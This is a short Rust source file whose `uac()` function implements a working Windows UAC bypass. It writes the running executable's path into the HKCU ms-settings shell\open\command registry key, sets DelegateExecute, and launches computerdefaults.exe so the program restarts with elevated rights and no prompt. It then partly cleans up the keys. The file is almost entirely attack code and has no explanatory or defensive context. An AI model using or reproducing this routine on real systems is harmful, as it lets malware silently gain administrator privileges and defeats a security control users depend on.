use std::process::Command;
use std::io;
use std::env::current_exe;

use winreg::{RegKey, RegValue, enums::*};

fn check_create(keyname: &str) -> io::Result<RegKey>
{
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    match hkcu.open_subkey_with_flags(format!("Software\\{}", keyname), KEY_WRITE)
    {
        Ok(key) => return Ok(key),
        Err(_) => {
            let key = hkcu.create_subkey_with_flags(format!("Software\\{}", keyname), KEY_WRITE)?;
            return Ok(key.0);
        }
    }
}

pub fn uac() -> io::Result<()>
{
    let raw_path = current_exe()?;
    let path = raw_path.to_str().unwrap();
    
    let data = RegValue {vtype: REG_DWORD, bytes: vec![0]};

    check_create("Classes")?;
    check_create("Classes\\ms-settings")?;
    check_create("Classes\\ms-settings\\shell")?;
    check_create("Classes\\ms-settings\\shell\\open")?;

    let key = check_create("Classes\\ms-settings\\shell\\open\\command")?;
    key.set_value("", &path)?;
    key.set_raw_value("DelegateExecute", &data)?;

    let mut process = Command::new("cmd.exe")
        .args(&["/c start computerdefaults.exe"])
        .spawn()?;

    match process.try_wait()
    {
        Ok(Some(_)) => RegKey::predef(HKEY_CURRENT_USER).delete_subkey_all("Software\\Classes\\ms-settings\\shell")?,
        _ => {},
    }

    Ok(())
}